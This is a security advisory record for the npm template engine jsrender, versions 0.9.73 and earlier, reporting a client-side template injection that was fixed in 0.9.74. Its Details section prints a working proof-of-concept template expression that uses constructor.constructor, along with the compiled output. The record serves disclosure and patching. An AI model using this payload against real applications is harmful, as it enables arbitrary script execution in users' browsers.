---
Publication-State: Active
Access: Public
Reviewers:
- Name: Paweł Hałdrzyński
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/jsrender
Review-Date: '2016-03-30'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Template Injection*<br><br>Upgrade to at least version 0.9.74
### Details
jsrender is a template engine for use within the browser or node.js.  If JsRender version 0.9.73 or earlier is used with server-delivered client-side templates that dynamically embed end-user input, then it is possible for a malicious user to execute arbitrary client-side code via use of a very specific expression. This threat has been removed in version 0.9.74 and all subsequent updates.  The finder of this vulnerability provided a proof of concept demonstrating code execution. ``` <POC-REQUEST> {{for ~x!=1?(constructor.constructor("return arguments.callee.caller")()):~y(10)}} {{:#data}} {{/for}} </POC-REQUEST> ```  ``` <POC-RESPONSE> function anonymous(data,view,j,u) { // template var v,t=j._tag,ret="" +t("for",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\"return arguments.callee.caller\")()):~y(10)']}, args:[view.hlp("x")!=1?(data.constructor.constructor("return arguments.callee.caller")()):view.hlp("y")(10)], props:{}}]); return ret; }  <POC-RESPONSE> ```
<br><br>• Affected Versions: <=0.9.73
<br>• Patched Versions: >=0.9.74
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://github.com/BorisMoore/jsrender/commit/f984e139deb0a7648d5b543860ec652c21f6dcf6']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
